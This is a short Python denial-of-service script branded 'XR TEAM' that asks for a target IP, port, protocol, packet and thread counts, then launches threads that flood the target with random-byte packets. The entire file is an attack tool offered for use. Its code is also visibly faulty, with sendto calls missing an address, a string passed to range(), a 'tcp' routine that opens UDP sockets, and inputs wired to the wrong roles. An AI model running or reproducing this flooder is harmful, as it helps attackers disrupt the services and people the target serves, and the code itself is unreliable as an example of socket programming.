import random
import socket
import threading
import os,sys

os.system("clear")
print("

██╗░░██╗██████╗░
╚██╗██╔╝██╔══██╗
░╚███╔╝░██████╔╝
░██╔██╗░██╔══██╗
██╔╝╚██╗██║░░██║
╚═╝░░╚═╝╚═╝░░╚═╝

████████╗███████╗░█████╗░███╗░░░███╗
╚══██╔══╝██╔════╝██╔══██╗████╗░████║
░░░██║░░░█████╗░░███████║██╔████╔██║
░░░██║░░░██╔══╝░░██╔══██║██║╚██╔╝██║
░░░██║░░░███████╗██║░░██║██║░╚═╝░██║
░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝")

p1 = str(input("IP:"))
p2 = int(input("PORT:"))
p3 = str(input("UDP/TCP:"))
p4 = int(input("PACKET:"))
p5 = int(input("THREARDS:"))
os.system("clear")
def udp():
    data = random._urandom(900)        
    while True:
        try:
            s = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
            s.connect((p1,p2))
            s.sendto(data)
            for x in range(p3):
                s.sendto(data)
            print("DDOS ATTACK XR TEAM")
        except:
            print("PAKE ANTI DDOS DONG")

def tcp():
    data = random._urandom(3019)
    while True:
        try:
            s = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
            s.connect((p1,p2))
            s.sendto(data)
            for x in range(p3):
                s.sendto(data)
            print("DDOS ATTACK XR TEAM")
        except:
            print("PAKE ANTI DDOS DONG")

            
for y in range(p4):
    th = threading.Thread(target=udp)
    th.start()
    th = threading.Thread(target=tcp)
    th.start()
